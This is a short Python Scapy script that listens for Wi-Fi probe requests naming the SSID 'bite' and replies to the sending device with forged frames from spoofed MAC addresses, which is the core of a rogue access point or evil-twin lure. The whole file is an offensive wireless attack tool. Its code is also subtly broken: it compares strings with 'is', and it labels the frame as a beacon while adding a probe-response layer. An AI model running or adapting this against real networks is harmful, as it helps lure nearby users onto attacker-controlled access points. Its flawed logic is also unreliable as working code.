#! /usr/bin/env python
from scapy.all import *

# SSID to target
SSID='bite'
# interface name, check using iwconfig
interface = "wlan0"

def callback(packet):
    if packet.haslayer(Dot11ProbeReq):
        # extract the MAC address of the sender
        sender = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        
        if ssid is SSID:
            print("Found a probe request for SSID " + SSID + " by client MAC " + sender)
            # send probe response to target
            dot11 = Dot11(type=0, subtype=8, addr1=sender, addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
            essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))

            frame = RadioTap()/dot11/Dot11ProbeResp()/essid
            # send the beacon frame 100 times with inter time 0.1s
            sendp(frame, inter=0.1, count=100, iface=interface, verbose=1)

# start sniffing
print("Scanning looking for Probe Request of SSID " + SSID + " for 10 seconds...")
sniff(prn=callback, iface=interface, timeout=10)
